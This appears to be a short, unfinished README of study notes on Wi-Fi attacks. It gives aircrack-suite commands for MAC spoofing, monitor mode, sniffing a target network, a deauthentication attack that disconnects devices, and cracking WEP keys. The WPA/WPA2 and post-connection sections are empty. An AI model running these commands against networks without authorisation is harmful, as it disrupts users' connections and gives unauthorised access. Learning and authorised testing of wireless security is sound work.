# Projet-WiFi

* Pre-connection attacks, gaining access & post-connection attacks on WEP, WPA & WPA2.

### Prerequisites
0. Linux + wireless adapter.

1. Change the MAC address of your wireless adapter, either for hiding a computer on a network or for allowing it to impersonate another network device.

```
ifconfig wireless_adapter_name down
ifconfig wireless_adapter_name hw ether 00:19:35:89:88:14
ifconfig wireless_adapter_name up
```

2. Change your wireless interface to "Monitor" mode. By default, the mode of wireless devices is set to "Managed", that means our wireless device will only capture packets that have our device's MAC address as the destination MAC.

```
ifconfig wireless_adapter_name down
airmon-ng check kill (kill all interference processes)
iwconfig wireless_adapter_name mode monitor
ifconfig wireless_adapter_name up
iwconfig
```

### Pre-connection attacks
1. Discover networks around you:
```
airodump-ng wireless_adapter_name
```
![Discover networks around you](https://user-images.githubusercontent.com/64968597/134020395-c7a67e4b-d7d0-4a84-a155-8a67fdf449c9.JPG)

2. Sniff packet from a specified network:
```
airodump-ng --bssid target_MAC --channel N (--write file_name) wireless_adapter_name
```

3. Deauthentication attack (disconnect any device from the network):

This attack will always work ! The only way around it is to change the MAC address on the target machine.
```
aireplay-ng --deauth time_out -a router_addr -c target_mac_addr wireless_adapter_name
```
 

✔️ 

### Gaining access

1. WEP cracking (100% successful):
   
   Each packet is encrypted using a unique key stream. A random initialization vector (IV) is used to generate the keys stream. This initialization vector is only 24 bits long.
   The IV is too small and sent in plain text, so in busy networks, IV's will repeat, making it vulnerable to statistical attacks. Therefore, the key stream can be determined      and the encryption broken.

   To crack WEP, we need a large number of packets/IVs to analyse the IVs and crack the router's key.

   Step 1: capture a large number of packets
   ```
   airodump-ng --bssid MAC --channel N --write file_name wlan0
   ```
   
   Step 2: run aircrack-ng to crack the password
   ```
   aircrack-ng .cap_file_captured_previously
   ```
   Gets cracked instantly !
   
2. WPA/WPA2 cracking:

### Post-connection attacks

✔️
